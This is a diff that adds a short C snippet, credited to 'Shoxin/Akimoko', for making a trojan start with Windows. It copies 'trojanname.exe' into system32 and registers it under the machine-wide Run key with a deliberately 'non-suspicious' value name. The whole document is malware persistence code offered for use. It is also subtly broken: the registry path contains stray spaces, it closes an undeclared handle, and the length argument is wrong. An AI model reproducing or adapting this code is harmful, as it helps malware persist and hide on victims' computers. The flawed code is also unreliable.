@@ -1,0 +1,23 @@
+/* 
+*   Adding to Startup 
+*   Code Snippet By Shoxin/Akimoko 
+*/ 
+ 
+#include <windows.h> 
+#define DATA "trojanname.exe" 
+ 
+int main() 
+{ 
+   HKEY key; 
+ 
+   CopyFile("trojanname.exe", "c:\\windows\\system32\\trojanname.exe", 0); 
+ 
+   RegCreateKeyEx(HKEY_LOCAL_MACHINE, 
+   "SOFTWARE\\ Microsoft\\Windows \\CurrentVersion\\Run", 0, NULL, 
+   REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, 
+                  &key, 0); 
+ 
+   RegSetValueExA(key, "non-suspicious name", 0, REG_SZ, DATA, 50); 
+   RegCloseKey(autoKey); 
+ 
+} 
